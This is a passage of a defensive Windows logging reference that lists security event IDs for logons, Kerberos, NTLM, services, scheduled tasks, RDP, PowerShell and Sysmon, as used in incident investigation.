    
- **4634/4647** logoff
    
- **4648** explicit credentials
    
- **4672** special privileges
    
- **4768/4769/4771** Kerberos (TGT/TGS/failures)
    
- **4776** NTLM
    
- **4740** account lockout
    
- **4778/4779** session reconnect/disconnect
    

### Execution / Service / Task

- **4688** process create
    
- **4697** service install
    
- **7045** new service installed (System)
    
- **4698** task created
    
- **4702** task updated
    
- **4699** task deleted
    
- **4700/4701** task enable/disable
    

### RDP

- `RemoteConnectionManager` **1149**
    
- `LocalSessionManager` **24 / 25 / 39**
    
- Security **4624** Type **10** or **7** (RDP / reconnect)
    

### PowerShell / Sysmon

- PowerShell: **4103 / 4104**
    
- Sysmon: **1 / 3 / 11 / 13 / 22** (+ others as needed)
